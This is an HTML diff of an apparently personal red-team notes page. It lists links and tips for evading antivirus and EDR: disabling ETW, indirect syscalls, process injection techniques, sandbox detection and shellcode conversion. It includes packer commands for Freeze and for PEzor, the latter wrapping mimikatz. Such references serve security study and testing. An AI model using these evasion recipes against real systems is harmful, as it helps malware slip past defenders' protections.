+<section id="dynamic-1">
+<span id="id6"></span><h3>Dynamic<a class="headerlink" href="#dynamic-1" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>Disable ETW</p>
+<ul>
+<li><p><a class="reference external" href="https://github.com/optiv/ScareCrow">https://github.com/optiv/ScareCrow</a></p></li>
+<li><p><a class="reference external" href="https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32">https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32</a></p></li>
+<li><p><a class="reference external" href="https://github.com/Soledge/BlockEtw">https://github.com/Soledge/BlockEtw</a></p></li>
+<li><p><a class="reference external" href="https://github.com/CCob/SharpBlock">https://github.com/CCob/SharpBlock</a></p></li>
+</ul>
+</li>
+<li><p>Indirect syscall</p>
+<ul>
+<li><p><a class="reference external" href="https://github.com/optiv/Freeze">https://github.com/optiv/Freeze</a></p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">Freeze</span> <span class="pre">-I</span> <span class="pre">/PathToShellcode</span> <span class="pre">-encrypt</span> <span class="pre">-sandbox</span> <span class="pre">-o</span> <span class="pre">packed.exe</span></code></p></li>
+</ul>
+</li>
+<li><p><a class="reference external" href="https://github.com/phra/PEzor">https://github.com/phra/PEzor</a></p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">PEzor.sh</span> <span class="pre">-sgn</span> <span class="pre">-unhook</span> <span class="pre">-antidebug</span> <span class="pre">-text</span> <span class="pre">-syscalls</span> <span class="pre">-sleep=120</span> <span class="pre">mimikatz/x64/mimikatz.exe</span> <span class="pre">-z</span> <span class="pre">2</span></code></p></li>
+</ul>
+</li>
+<li><p><a class="reference external" href="https://github.com/optiv/ScareCrow">https://github.com/optiv/ScareCrow</a></p></li>
+<li><p><a class="reference external" href="https://github.com/klezVirus/SysWhispers3">https://github.com/klezVirus/SysWhispers3</a></p></li>
+<li><p><a class="reference external" href="https://github.com/jthuraisamy/SysWhispers2">https://github.com/jthuraisamy/SysWhispers2</a></p></li>
+</ul>
+</li>
+<li><p>Disable AV</p>
+<ul>
+<li><p><a class="reference external" href="https://github.com/APTortellini/unDefender">https://github.com/APTortellini/unDefender</a></p></li>
+</ul>
+</li>
+<li><p>Block DLL</p></li>
+<li><p><a class="reference external" href="https://github.com/CCob/SharpBlock">https://github.com/CCob/SharpBlock</a></p></li>
+<li><p>Detect virtual machines</p></li>
+<li><p><a class="reference external" href="https://github.com/a0rtega/pafish">https://github.com/a0rtega/pafish</a></p></li>
+</ul>
+</section>
+</section>
+<section id="process-injection">
+<h2>Process injection<a class="headerlink" href="#process-injection" title="Link to this heading"></a></h2>
+<section id="crt">
+<h3>CRT<a class="headerlink" href="#crt" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>with suspended</p></li>
+<li><p><a class="reference external" href="https://damonmohammadbagher.medium.com/bypassing-anti-virus-by-creating-remote-thread-into-target-process-45f145b2ac7a">https://damonmohammadbagher.medium.com/bypassing-anti-virus-by-creating-remote-thread-into-target-process-45f145b2ac7a</a></p></li>
+</ul>
+</section>
+<section id="apc-asyncronous-procedure-call">
+<h3>APC (Asyncronous Procedure Call)<a class="headerlink" href="#apc-asyncronous-procedure-call" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://subscription.packtpub.com/book/security/9781789610789/8/ch08lvl1sec50/executing-the-inject-code-using-apc-queuing">https://subscription.packtpub.com/book/security/9781789610789/8/ch08lvl1sec50/executing-the-inject-code-using-apc-queuing</a></p></li>
+<li><p><a class="reference external" href="https://github.com/LloydLabs/ntqueueapcthreadex-ntdll-gadget-injection">https://github.com/LloydLabs/ntqueueapcthreadex-ntdll-gadget-injection</a></p></li>
+<li><p><a class="reference external" href="https://decoded.avast.io/janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/">https://decoded.avast.io/janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/</a></p></li>
+</ul>
+</section>
+<section id="process-hollowing">
+<h3>Process hollowing<a class="headerlink" href="#process-hollowing" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#relocation">https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#relocation</a></p></li>
+<li><p><a class="reference external" href="https://sevrosecurity.com/2020/04/08/process-injection-part-1-createremotethread/">https://sevrosecurity.com/2020/04/08/process-injection-part-1-createremotethread/</a></p></li>
+<li><p><a class="reference external" href="https://0xsp.com/security%20research%20%20development%20srd/defeat-the-castle-bypass-av-advanced-xdr-solutions/">https://0xsp.com/security%20research%20%20development%20srd/defeat-the-castle-bypass-av-advanced-xdr-solutions/</a></p></li>
+<li><p><a class="reference external" href="https://github.com/0xsp-SRD/mortar">https://github.com/0xsp-SRD/mortar</a></p></li>
+<li><p><a class="reference external" href="https://www.blackhat.com/docs/asia-17/materials/asia-17-KA-What-Malware-Authors-Don't-Want-You-To-Know-Evasive-Hollow-Process-Injection-wp.pdf">https://www.blackhat.com/docs/asia-17/materials/asia-17-KA-What-Malware-Authors-Don’t-Want-You-To-Know-Evasive-Hollow-Process-Injection-wp.pdf</a></p></li>
+</ul>
+</section>
+<section id="thread-execution-hijacking">
+<h3>Thread execution hijacking<a class="headerlink" href="#thread-execution-hijacking" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1055/003/">https://attack.mitre.org/techniques/T1055/003/</a></p></li>
+</ul>
+</section>
+<section id="psc-ptrace-system-calls">
+<h3>PSC (Ptrace System Calls)<a class="headerlink" href="#psc-ptrace-system-calls" title="Link to this heading"></a></h3>
+</section>
+<section id="process-doppelganging">
+<h3>Process Doppelganging<a class="headerlink" href="#process-doppelganging" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://thehackernews.com/2017/12/malware-process-doppelganging.html">https://thehackernews.com/2017/12/malware-process-doppelganging.html</a></p></li>
+</ul>
+</section>
+<section id="dll-injection">
+<h3>Dll injection<a class="headerlink" href="#dll-injection" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>Reflective dll injection</p>
+<ul>
+<li><p><a class="reference external" href="https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html">https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html</a></p></li>
+</ul>
+</li>
+<li><p><a class="reference external" href="https://github.com/fancycode/MemoryModule">https://github.com/fancycode/MemoryModule</a></p></li>
+<li><p><a class="reference external" href="https://github.com/TheD1rkMtr/NTDLLReflection">https://github.com/TheD1rkMtr/NTDLLReflection</a></p></li>
+<li><p><a class="reference external" href="https://github.com/reveng007/ReflectiveNtdll">https://github.com/reveng007/ReflectiveNtdll</a></p></li>
+</ul>
+<p><a class="reference external" href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection">https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection</a>
+- DLL Sideloading &amp; Proxying -
+<a class="reference external" href="https://book.hacktricks.xyz/windows-hardening/windows-av-bypass#dll-sideloading-and-proxying">https://book.hacktricks.xyz/windows-hardening/windows-av-bypass#dll-sideloading-and-proxying</a></p>
+</section>
+<section id="rwx">
+<h3>RWX<a class="headerlink" href="#rwx" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>You put your region in RW, you write your shellcode, then you
+reprotect in RX, then you run the thread. This way your region is
+never in rwx</p></li>
+</ul>
+</section>
+<section id="com-hijack">
+<h3>COM Hijack<a class="headerlink" href="#com-hijack" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.mdsec.co.uk/2022/04/process-injection-via-component-object-model-com-irundowndocallback/">https://www.mdsec.co.uk/2022/04/process-injection-via-component-object-model-com-irundowndocallback/</a></p></li>
+<li><p><a class="reference external" href="https://0xpat.github.io/Abusing_COM_Objects/">https://0xpat.github.io/Abusing_COM_Objects/</a></p></li>
+</ul>
+</section>
+<section id="remote-thread">
+<h3>Remote thread<a class="headerlink" href="#remote-thread" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.cyberbit.com/blog/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/">https://www.cyberbit.com/blog/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/</a></p></li>
+</ul>
+</section>
+<section id="user-apc">
+<h3>User APC<a class="headerlink" href="#user-apc" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.cyberbit.com/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/">https://www.cyberbit.com/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/</a></p></li>
+</ul>
+</section>
+</section>
+<section id="detect-virtual-machines-sandbox">
+<h2>Detect virtual machines (Sandbox)<a class="headerlink" href="#detect-virtual-machines-sandbox" title="Link to this heading"></a></h2>
+<section id="software">
+<h3>Software<a class="headerlink" href="#software" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>Count processus number</p>
+<ul>
+<li><p>if &gt;=40 its probably not a VM</p></li>
+</ul>
+</li>
+<li><p>User interaction</p>
+<ul>
+<li><p>Send MessageBoxW</p></li>
+</ul>
+</li>
+<li><p>Check for internet</p></li>
+<li><p>Datetime on compilation</p></li>
+<li><p>Check for Computer name</p>
+<ul>
+<li><p>VM = DESKTOP-[0-9A-Z]{7}</p></li>
+</ul>
+</li>
+</ul>
+</section>
+<section id="hardware">
+<h3>Hardware<a class="headerlink" href="#hardware" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>CPUID timing</p>
+<ul>
+<li><p><a class="reference external" href="https://github.com/matro7sh/bof-collection/blob/main/src/checkVM/checkVM2.c">https://github.com/matro7sh/bof-collection/blob/main/src/checkVM/checkVM2.c</a></p></li>
+</ul>
+</li>
+<li><p>Typical user workstation has a processor with at least 2 cores, a
+minimum of 2 GB of RAM and a 100 GB hard drive</p></li>
+</ul>
+</section>
+<section id="osx">
+<h3>OSX<a class="headerlink" href="#osx" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://evasions.checkpoint.com/techniques/macos.html#macos-sandbox-methods">https://evasions.checkpoint.com/techniques/macos.html#macos-sandbox-methods</a></p></li>
+</ul>
+</section>
+<section id="tools">
+<h3>Tools<a class="headerlink" href="#tools" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/a0rtega/pafish">https://github.com/a0rtega/pafish</a></p></li>
+</ul>
+</section>
+</section>
+<section id="from-pe-to-shellcode">
+<h2>From PE to shellcode<a class="headerlink" href="#from-pe-to-shellcode" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/S4ntiagoP/donut/tree/syscalls">https://github.com/S4ntiagoP/donut/tree/syscalls</a></p></li>
+<li><p><a class="reference external" href="https://github.com/hasherezade/pe_to_shellcode">https://github.com/hasherezade/pe_to_shellcode</a></p></li>
+<li><p><a class="reference external" href="https://github.com/monoxgas/sRDI">https://github.com/monoxgas/sRDI</a></p></li>
+</ul>
+</section>
+<section id="from-exe-build-with-net-to-exe-hidden">
+<h2>From .exe (build with .net) to .exe hidden<a class="headerlink" href="#from-exe-build-with-net-to-exe-hidden" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0">https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0</a></p></li>
+</ul>
+</section>
+<section id="from-alive-beacon">
+<h2>From alive beacon<a class="headerlink" href="#from-alive-beacon" title="Link to this heading"></a></h2>
+<section id="havoc">
+<h3>Havoc<a class="headerlink" href="#havoc" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>dotnet (object file)</p></li>
+</ul>
+</section>
+<section id="cobalt">
+<h3>Cobalt<a class="headerlink" href="#cobalt" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>BoF (Beacon object file)</p>
+<ul>
+<li><p>From .net to BoF</p>
+<ul>
+<li><p><a class="reference external" href="https://github.com/CCob/BOF.NET">https://github.com/CCob/BOF.NET</a></p></li>
+</ul>
+</li>
+<li><p><a class="reference external" href="https://github.com/trustedsec/CS-Situational-Awareness-BOF">https://github.com/trustedsec/CS-Situational-Awareness-BOF</a></p></li>
+</ul>
+</li>
+</ul>
+</section>
+</section>
+<section id="extensions">
+<h2>Extensions<a class="headerlink" href="#extensions" title="Link to this heading"></a></h2>
+<section id="dll">
+<h3>Dll<a class="headerlink" href="#dll" title="Link to this heading"></a></h3>
+</section>
+<section id="exe">
+<h3>Exe<a class="headerlink" href="#exe" title="Link to this heading"></a></h3>
+</section>
+<section id="hta">
+<h3>Hta<a class="headerlink" href="#hta" title="Link to this heading"></a></h3>
+</section>
+<section id="cpl">
+<h3>Cpl<a class="headerlink" href="#cpl" title="Link to this heading"></a></h3>
+</section>
+<section id="link">
+<h3>Link<a class="headerlink" href="#link" title="Link to this heading"></a></h3>
+</section>
+</section>
+<section id="credits">
+<h2>Crédits<a class="headerlink" href="#credits" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://twitter.com/Jenaye_fr">&#64;Jenaye_fr</a></p></li>
+<li><p><a class="reference external" href="https://github.com/LeDocteurDesBits">LeDocteurDesBits</a></p></li>
+<li><p><a class="reference external" href="https://github.com/michmich1000">michmich1000</a></p></li>
+<li><p><a class="reference external" href="https://twitter.com/Zabannn">&#64;Zabannn</a></p></li>
+<li><p><a class="reference external" href="https://twitter.com/noraj_rawsec">&#64;noraj_rawsec</a></p></li>
+<li><p><a class="reference external" href="https://github.com/lap1nou">&#64;lapinousexy</a></p></li>
+<li><p><a class="reference external" href="https://github.com/bogdzn">&#64;djnn</a></p></li>
+</ul>
+</section>
+<section id="pro-tips-a-shellcode-going-through-3-open-source-packers-will-have-more-chance-to-get-detected-than-a-manual-obfuscation">
+<h2>Pro tips : A shellcode going through 3 open-source packers will have more chance to get detected than a manual obfuscation<a class="headerlink" href="#pro-tips-a-shellcode-going-through-3-open-source-packers-will-have-more-chance-to-get-detected-than-a-manual-obfuscation" title="Link to this heading"></a></h2>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="../recon/Active%20Scanning.html" class="btn btn-neutral float-left" title="Active Scanning (T5195)" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="../../CPTS/Penetration%20Testing%20Overview.html" class="btn btn-neutral float-right" title="Penetration Testing Overview" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2024, James Jamieson.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
